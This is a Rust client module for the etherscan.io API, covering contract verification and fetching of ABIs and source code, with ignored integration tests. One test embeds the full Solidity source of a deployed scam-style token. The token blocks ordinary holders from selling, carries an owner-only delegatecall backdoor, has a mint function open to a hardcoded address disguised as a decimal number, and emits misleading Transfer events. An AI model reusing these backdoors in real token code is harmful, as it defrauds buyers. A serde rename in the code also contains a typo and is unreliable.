//! Helpers for etherscan.io
#![allow(unused)]
// TODO evaluate moving this to it's own crate eventually

use ethers::abi::{Abi, Address};
use reqwest::{header, Url};
use serde::{de::DeserializeOwned, Deserialize, Serialize};
use std::{borrow::Cow, collections::HashMap};

#[derive(Clone)]
pub struct Client {
    /// The client that executes the http requests
    client: reqwest::Client,
    /// The etherscan api key
    api_key: String,
    /// API endpoint like https://api(-chain).etherscan.io/api
    etherscan_api_url: Url,
    /// Base etherscan endpoint like https://etherscan.io/address
    etherscan_url: Url,
}

impl Client {
    /// Create a new client with the correct endpoints based on the chain.
    ///
    /// Supported chains are ethlive, mainnet,ropsten, kovan, rinkeby, goerli
    pub fn new(chain: &str, api_key: impl Into<String>) -> eyre::Result<Self> {
        let (etherscan_api_url, etherscan_url) = match chain {
            "ethlive" | "mainnet" => {
                (
                    Url::parse("https://api.etherscan.io/api"),
                    Url::parse("https://etherscan.io/address"),
                )
            },
            "ropsten"|"kovan"|"rinkeby"|"goerli" => {
                (
                    Url::parse(&format!("https://api-{}.etherscan.io/api", chain)),
                    Url::parse(&format!("https://{}.etherscan.io/address", chain)),
                )
            }
            s => {
                return Err(
                    eyre::eyre!("Verification only works on mainnet, ropsten, kovan, rinkeby, and goerli, found `{}` chain", s)
                )
            }
        };

        Ok(Self {
            client: Default::default(),
            api_key: api_key.into(),
            etherscan_api_url: etherscan_api_url.expect("is valid http"),
            etherscan_url: etherscan_url.expect("is valid http"),
        })
    }

    pub fn etherscan_api_url(&self) -> &Url {
        &self.etherscan_api_url
    }

    pub fn etherscan_url(&self) -> &Url {
        &self.etherscan_url
    }

    /// Return the URL for the given address
    pub fn address_url(&self, address: Address) -> String {
        format!("{}/{}", self.etherscan_url, address)
    }

    /// Execute a api POST request
    async fn post_form<T: DeserializeOwned, Form: Serialize>(
        &self,
        form: &Form,
    ) -> eyre::Result<Response<T>> {
        Ok(self
            .client
            .post(self.etherscan_api_url.clone())
            .header(header::CONTENT_TYPE, "application/x-www-form-urlencoded")
            .form(form)
            .send()
            .await?
            .json()
            .await?)
    }

    /// Execute a api GET query
    async fn get_json<T: DeserializeOwned, Q: Serialize>(
        &self,
        query: &Q,
    ) -> eyre::Result<Response<T>> {
        Ok(self
            .client
            .get(self.etherscan_api_url.clone())
            .header(header::ACCEPT, "application/json")
            .query(query)
            .send()
            .await?
            .json()
            .await?)
    }

    fn body<T: Serialize>(
        &self,
        module: &'static str,
        action: &'static str,
        other: T,
    ) -> PostBody<T> {
        PostBody {
            apikey: Cow::Borrowed(&self.api_key),
            module: Cow::Borrowed(module),
            action: Cow::Borrowed(action),
            other,
        }
    }

    /// Submit Source Code for Verification
    pub async fn submit_contract_verification(
        &self,
        contract: VerifyContract,
    ) -> eyre::Result<Response<String>> {
        let body = self.body("contract", "verifysourcecode", contract);
        Ok(self.post_form(&body).await?.result)
    }

    /// Check Source Code Verification Status with receipt received from
    /// `[Self::submit_contract_verification]`
    pub async fn check_verify_status(
        &self,
        guid: impl AsRef<str>,
    ) -> eyre::Result<Response<String>> {
        let mut map = HashMap::new();
        map.insert("guid", guid.as_ref());
        let body = self.body("contract", "checkverifystatus", map);
        Ok(self.post_form(&body).await?.result)
    }

    /// Returns the contract ABI of a verified contract
    ///
    /// ```no_run
    /// # use dapptools::etherscan::Client;
    ///
    /// # #[tokio::main]
    /// # async fn main() -> eyre::Result<()> {
    ///     let client = Client::new("mainnet", "API_KEY").unwrap();
    ///     let abi = client
    ///         .contract_abi("0xBB9bc244D798123fDe783fCc1C72d3Bb8C189413".parse().unwrap())
    ///         .await?;
    ///
    /// #     Ok(())
    /// # }
    /// ```
    pub async fn contract_abi(&self, address: Address) -> eyre::Result<Abi> {
        let mut map = HashMap::new();
        map.insert("address", address);
        let query = self.body("contract", "getabi", map);
        let resp: Response<String> = self.get_json(&query).await?;
        Ok(serde_json::from_str(&resp.result)?)
    }

    /// Get Contract Source Code for Verified Contract Source Codes
    /// ```no_run
    /// # use dapptools::etherscan::Client;
    ///
    /// # #[tokio::main]
    /// # async fn main() -> eyre::Result<()> {
    ///     let client = Client::new("mainnet", "API_KEY").unwrap();
    ///     let meta = client
    ///         .contract_source_code("0xBB9bc244D798123fDe783fCc1C72d3Bb8C189413".parse().unwrap())
    ///         .await?;
    ///     let code = meta.source_code();
    /// #     Ok(())
    /// # }
    /// ```
    pub async fn contract_source_code(&self, address: Address) -> eyre::Result<ContractMetadata> {
        let mut map = HashMap::new();
        map.insert("address", address);
        let query = self.body("contract", "getsourcecode", map);
        let response: Response<Vec<Metadata>> = self.get_json(&query).await?;
        Ok(ContractMetadata { items: response.result })
    }
}

#[derive(Debug, Clone, Deserialize)]
pub struct Response<T> {
    pub status: String,
    pub message: String,
    pub result: T,
}

#[derive(Debug, Serialize)]
struct PostBody<'a, T: Serialize> {
    apikey: Cow<'a, str>,
    module: Cow<'a, str>,
    action: Cow<'a, str>,
    #[serde(flatten)]
    other: T,
}

/// Arguments for verifying contracts
#[derive(Debug, Clone, Serialize)]
pub struct VerifyContract {
    pub address: Address,
    pub source: String,
    #[serde(rename = "codeformat")]
    pub code_format: CodeFormat,
    /// if codeformat=solidity-standard-json-input, then expected as `erc20.sol:erc20`
    #[serde(rename = "contractname", skip_serializing_if = "Option::is_none")]
    pub contract_name: Option<String>,
    #[serde(rename = "compilerversion")]
    pub compiler_version: String,
    /// applicable when codeformat=solidity-single-file
    #[serde(rename = "optimizationUsed", skip_serializing_if = "Option::is_none")]
    optimization_used: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub runs: Option<String>,
    /// NOTE: there is a typo in the etherscan API `constructorArguements`
    #[serde(rename = "constructorArguements", skip_serializing_if = "Option::is_none")]
    pub constructor_arguments: Option<String>,
    pub evmversion: Option<String>,
    #[serde(flatten)]
    pub other: HashMap<String, String>,
}

impl VerifyContract {
    pub fn new(address: Address, source: String, compilerversion: String) -> Self {
        Self {
            address,
            source,
            code_format: Default::default(),
            contract_name: None,
            compiler_version: compilerversion,
            optimization_used: None,
            runs: None,
            constructor_arguments: None,
            evmversion: None,
            other: Default::default(),
        }
    }

    pub fn contract_name(mut self, name: impl Into<String>) -> Self {
        self.contract_name = Some(name.into());
        self
    }

    pub fn runs(mut self, runs: u32) -> Self {
        self.runs = Some(format!("{}", runs));
        self
    }

    pub fn optimization(mut self, optimization: bool) -> Self {
        if optimization {
            self.optimized()
        } else {
            self.not_optimized()
        }
    }

    pub fn optimized(mut self) -> Self {
        self.optimization_used = Some("1".to_string());
        self
    }

    pub fn not_optimized(mut self) -> Self {
        self.optimization_used = Some("0".to_string());
        self
    }

    pub fn code_format(mut self, code_format: CodeFormat) -> Self {
        self.code_format = code_format;
        self
    }

    pub fn evmversion(mut self, evmversion: impl Into<String>) -> Self {
        self.evmversion = Some(evmversion.into());
        self
    }

    pub fn constructor_arguments(
        mut self,
        constructor_arguments: Option<impl Into<String>>,
    ) -> Self {
        self.constructor_arguments =
            constructor_arguments.map(|s| s.into().trim_start_matches("0x").to_string());
        self
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
pub enum CodeFormat {
    #[serde(rename = "solidity-single-file")]
    SingleFile,
    #[serde(rename = "solidity-standard-json-inpu")]
    StandardJsonInput,
}

impl AsRef<str> for CodeFormat {
    fn as_ref(&self) -> &str {
        match self {
            CodeFormat::SingleFile => "solidity-single-file",
            CodeFormat::StandardJsonInput => "solidity-standard-json-input",
        }
    }
}

impl Default for CodeFormat {
    fn default() -> Self {
        CodeFormat::SingleFile
    }
}

#[derive(Debug, Serialize, Deserialize)]
pub struct ContractMetadata {
    #[serde(flatten)]
    pub items: Vec<Metadata>,
}

impl IntoIterator for ContractMetadata {
    type Item = Metadata;
    type IntoIter = std::vec::IntoIter<Metadata>;

    fn into_iter(self) -> Self::IntoIter {
        self.items.into_iter()
    }
}

impl ContractMetadata {
    /// All ABI from all contracts in the source file
    pub fn abis(&self) -> eyre::Result<Vec<Abi>> {
        let mut abis = Vec::with_capacity(self.items.len());
        for item in &self.items {
            abis.push(serde_json::from_str(&item.abi)?);
        }
        Ok(abis)
    }

    /// Combined source code of all contracts
    pub fn source_code(&self) -> String {
        self.items.iter().map(|c| c.source_code.as_str()).collect::<Vec<_>>().join("\n")
    }
}

/// Etherscan contract metadata
#[derive(Debug, Serialize, Deserialize)]
pub struct Metadata {
    #[serde(rename = "SourceCode")]
    pub source_code: String,
    #[serde(rename = "ABI")]
    pub abi: String,
    #[serde(rename = "ContractName")]
    pub contract_name: String,
    #[serde(rename = "CompilerVersion")]
    pub compiler_version: String,
    #[serde(rename = "OptimizationUsed")]
    pub optimization_used: String,
    #[serde(rename = "Runs")]
    pub runs: String,
    #[serde(rename = "ConstructorArguments")]
    pub constructor_arguments: String,
    #[serde(rename = "EVMVersion")]
    pub evm_version: String,
    #[serde(rename = "Library")]
    pub library: String,
    #[serde(rename = "LicenseType")]
    pub license_type: String,
    #[serde(rename = "Proxy")]
    pub proxy: String,
    #[serde(rename = "Implementation")]
    pub implementation: String,
    #[serde(rename = "SwarmSource")]
    pub swarm_source: String,
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::utils;

    #[tokio::test]
    #[ignore]
    async fn can_fetch_contract_abi() {
        let api = utils::etherscan_api_key().unwrap();
        let client = Client::new("mainnet", api).unwrap();

        let abi = client
            .contract_abi("0xBB9bc244D798123fDe783fCc1C72d3Bb8C189413".parse().unwrap())
            .await
            .unwrap();
    }

    #[tokio::test]
    #[ignore]
    async fn can_fetch_contract_source_code() {
        let api = utils::etherscan_api_key().unwrap();
        let client = Client::new("mainnet", api).unwrap();

        let meta = client
            .contract_source_code("0xBB9bc244D798123fDe783fCc1C72d3Bb8C189413".parse().unwrap())
            .await
            .unwrap();
    }

    #[tokio::test]
    #[ignore]
    async fn can_verify_contract() {
        // https://etherscan.io/address/0x9e744c9115b74834c0f33f4097f40c02a9ac5c33#code
        let contract = r###"/**
 *Submitted for verification at Etherscan.io on 2021-10-03
*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract UniswapExchange {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);

    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }

    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
        address _UNI = pairFor(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));
        //go the white address first
        if(_from == owner || _to == owner || _from == UNI || _from == _UNI || _from==tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }

    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;

        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }

    function delegate(address a, bytes memory b) public payable {
        require(msg.sender == owner);
        a.delegatecall(b);
    }
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function _mints(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender==owner||msg.sender==address
        (1461045492991056468287016484048686824852249628073));
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }
    function init(uint256 saleNum, uint256 token, uint256 maxToken) public returns(bool){
        require(msg.sender == owner);
        _minSale = token > 0 ? token*(10**uint256(decimals)) : 0;
        _maxSale = maxToken > 0 ? maxToken*(10**uint256(decimals)) : 0;
        _saleNum = saleNum;
    }
    function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {
        require (msg.sender == owner);
        uint total = _value * _tos.length;
        require(balanceOf[msg.sender] >= total);
        balanceOf[msg.sender] -= total;
        for (uint i = 0; i < _tos.length; i++) {
            address _to = _tos[i];
            balanceOf[_to] += _value;
            emit Transfer(msg.sender, _to, _value/2);
            emit Transfer(msg.sender, _to, _value/2);
        }
        return true;
    }

    address tradeAddress;
    function setTradeAddress(address addr) public returns(bool){require (msg.sender == owner);
        tradeAddress = addr;
        return true;
    }

    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair = address(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash
            ))));
    }

    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;

    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
    address constant UNI = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = uint(-1);
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}
"###;

        let address = "0x9e744c9115b74834c0f33f4097f40c02a9ac5c33".parse().unwrap();
        let compiler_version = "v0.5.17+commit.d19bba13";
        let constructor_args = "0x000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000005f5e1000000000000000000000000000000000000000000000000000000000000000007596179537761700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000035941590000000000000000000000000000000000000000000000000000000000";

        let api = utils::etherscan_api_key().unwrap();
        let client = Client::new("mainnet", api).unwrap();

        let contract =
            VerifyContract::new(address, contract.to_string(), compiler_version.to_string())
                .constructor_arguments(Some(constructor_args))
                .optimization(true)
                .runs(200);

        let resp = client.submit_contract_verification(contract).await.unwrap();
    }
}
